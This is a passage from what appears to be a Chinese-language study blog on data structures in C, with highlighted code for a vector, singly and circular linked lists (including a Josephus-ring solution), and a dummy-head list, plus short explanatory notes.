v-&gt;d + loc + <span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (v-&gt;l - loc - <span class="hljs-number">1</span>));<br>    v-&gt;l--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(Vector *v)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> *tmp = v-&gt;d;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; v-&gt;l) &#123;<br>        (i &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, *tmp);<br>        ++i;<br>        ++tmp;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Vector *v)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(v-&gt;d);<br>    <span class="hljs-built_in">free</span>(v);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Vector *v = (Vector *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Vector));<br>    init(v, <span class="hljs-number">20</span>);<br>    <br>    <span class="hljs-comment">// random test: use  #include &lt;time.h&gt;   srand(time(NULL));  op = rand() % 4; ...</span><br><br>    <span class="hljs-keyword">int</span> n, op, loc, val;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;op);<br>        <span class="hljs-keyword">switch</span> (op) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d%d"</span>, &amp;loc, &amp;val);<br>                <span class="hljs-keyword">if</span> (insert(v, loc, val))<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"success\n"</span>);<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"failed\n"</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;loc);<br>                <span class="hljs-keyword">if</span> (delete_node(v, loc))<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"success\n"</span>);<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"failed\n"</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;val);<br>                <span class="hljs-keyword">if</span> (search(v, val))<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"success\n"</span>);<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"failed\n"</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                <span class="hljs-built_in">print</span>(v);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">clear</span>(v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="链表">链表</span></h3><h4><span id="implement">implement</span></h4><p>注意没有单独定义 linked list 结构体，没有记录长度。</p><h5><span id="示例用代码">示例用代码</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node, *LinkedList;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">insert</span><span class="hljs-params">(LinkedList head, Node *node, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (index != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        head = node;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) &#123;<br>        node-&gt;next = head;<br>        head = node;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    Node *current_node = head;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (current_node-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; count &lt; index - <span class="hljs-number">1</span>) &#123;<br>        current_node = current_node-&gt;next;<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (count == index - <span class="hljs-number">1</span>) &#123;<br>        node-&gt;next = current_node-&gt;next;<br>        current_node-&gt;next = node;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(LinkedList head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node *current_node = head;<br>    <span class="hljs-keyword">while</span> (current_node != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, current_node-&gt;data);<br>        current_node = current_node-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">delete_node</span><span class="hljs-params">(LinkedList head, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    Node *current_node = head;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) &#123;<br>        head = head-&gt;next;<br>        <span class="hljs-built_in">free</span>(current_node);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    <span class="hljs-comment">// count &lt; index - 1:  index 比 链表长度 大很多，count == index - 1 不会成立，这里就是要保证找到目标位置时，count == index - 1 成立</span><br>    <span class="hljs-keyword">while</span> (current_node-&gt;next != <span class="hljs-literal">NULL</span> &amp;&amp; count &lt; index - <span class="hljs-number">1</span>) &#123;<br>        current_node = current_node-&gt;next;<br>        count++;<br>    &#125;<br>    <span class="hljs-comment">// 停在要删除位置前一个，current_node-&gt;next != NULL 应该恒成立</span><br>    <span class="hljs-keyword">if</span> (count == index - <span class="hljs-number">1</span> &amp;&amp; current_node-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *delete_node = current_node-&gt;next;<br>        current_node-&gt;next = delete_node-&gt;next;<br>        <span class="hljs-built_in">free</span>(delete_node);<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">reverse</span><span class="hljs-params">(LinkedList head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    Node *next_node, *current_node;<br>    current_node = head-&gt;next;<br>    head-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (current_node != <span class="hljs-literal">NULL</span>) &#123;<br>        next_node = current_node-&gt;next;<br>        current_node-&gt;next = head;<br>        head = current_node;<br>        current_node = next_node;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(LinkedList head)</span> </span>&#123;<br>    Node *current_node = head;<br>    <span class="hljs-keyword">while</span> (current_node != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *delete_node = current_node;<br>        current_node = current_node-&gt;next;<br>        <span class="hljs-built_in">free</span>(delete_node);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkedList linkedlist = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++) &#123;<br>        Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        node-&gt;data = i;<br>        node-&gt;next = <span class="hljs-literal">NULL</span>;<br>        linkedlist = insert(linkedlist, node, i - <span class="hljs-number">1</span>);<br>    &#125;<br>    output(linkedlist);<br>    linkedlist = delete_node(linkedlist, <span class="hljs-number">9</span>);<br>    output(linkedlist);<br>    <br>    linkedlist = reverse(linkedlist);<br>    output(linkedlist);<br>    <br>    <span class="hljs-built_in">clear</span>(linkedlist);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5><span id="循环链表约瑟夫环">循环链表约瑟夫环</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-keyword">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node, *LinkedList;<br><br><span class="hljs-function">LinkedList <span class="hljs-title">insert</span><span class="hljs-params">(LinkedList head, Node *node, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (index != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        head = node;<br>        head-&gt;next = head;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) &#123;<br>        node-&gt;next = head-&gt;next;  <span class="hljs-comment">// 循环</span><br>        head-&gt;next = node;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    Node *current_node = head-&gt;next;  <span class="hljs-comment">// head为标记的尾节点</span><br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (current_node != head &amp;&amp; count &lt; index - <span class="hljs-number">1</span>) &#123;<br>        current_node = current_node-&gt;next;<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (count == index - <span class="hljs-number">1</span>) &#123;<br>        node-&gt;next = current_node-&gt;next;<br>        current_node-&gt;next = node;<br>    &#125;<br>    <span class="hljs-comment">// 此时更新尾节点</span><br>    <span class="hljs-keyword">if</span> (node == head-&gt;next) &#123;<br>        head = node;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 约瑟夫环</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output_josephus</span><span class="hljs-params">(LinkedList head, <span class="hljs-keyword">int</span> m)</span> </span>&#123;<br>    Node *current_node = head;<br>    head = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (current_node-&gt;next != current_node) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>            current_node = current_node-&gt;next;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, current_node-&gt;next-&gt;data);<br>        Node *delete_node = current_node-&gt;next;<br>        current_node-&gt;next = current_node-&gt;next-&gt;next;<br>        <span class="hljs-built_in">free</span>(delete_node);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, current_node-&gt;data);<br>    <span class="hljs-built_in">free</span>(current_node);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkedList linkedlist = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> n, m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d %d"</span>, &amp;n, &amp;m);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        Node *node = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        node-&gt;data = i;<br>        node-&gt;next = <span class="hljs-literal">NULL</span>;<br>        linkedlist = insert(linkedlist, node, i - <span class="hljs-number">1</span>);<br>    &#125;<br>    output_josephus(linkedlist, m);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>循环链表需要记录的是尾结点的位置。那么插入节点就不会循环一圈，才能找到尾结点。</p><h5><span id="增加-dummy-node-的解法-单向">增加 dummy node 的解法 单向</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">List</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// Node *head; 改为 dummy node, 而不再是一个指针</span><br>    Node head;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; List;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">List *<span class="hljs-title">initList</span><span class="hljs-params">()</span> </span>&#123;<br>    List *l = (List *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(List));<br>    l-&gt;head.next = <span class="hljs-literal">NULL</span>;<br>    l-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *del_ = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        del_ = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(del_);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(l);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertNode</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt; l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    n-&gt;next = prev-&gt;next;<br>    prev-&gt;next = n;<br><br>    l-&gt;len++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 插入输入值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertValue</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = initNode(val);<br>    <span class="hljs-keyword">if</span> (!insertNode(l, idx, n)) &#123;<br>        freeNode(n);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 删除</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">erase</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt;= l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    Node *tmp = prev-&gt;next;<br>    prev-&gt;next = tmp-&gt;next;<br><br>    freeNode(tmp);<br>    l-&gt;len--;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(List *l, <span class="hljs-keyword">int</span> idx)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> | idx &gt;= l-&gt;len) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    Node *prev = &amp;(l-&gt;head);<br>    <span class="hljs-keyword">while</span> (idx--)<br>        prev = prev-&gt;next;<br><br>    <span class="hljs-keyword">return</span> prev-&gt;next-&gt;val;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showList</span><span class="hljs-params">(List *l)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!l) <span class="hljs-keyword">return</span>;<br>    Node *p = l-&gt;head.next;<br>    Node *tmp = &amp;(l-&gt;head);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"List+: ["</span>);<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        tmp = p;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d-&gt;"</span>, p-&gt;val);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"NULL]\n"</span>);<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5><span id="增加-dummy-node-的解法-双向">增加 dummy node 的解法 双向</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 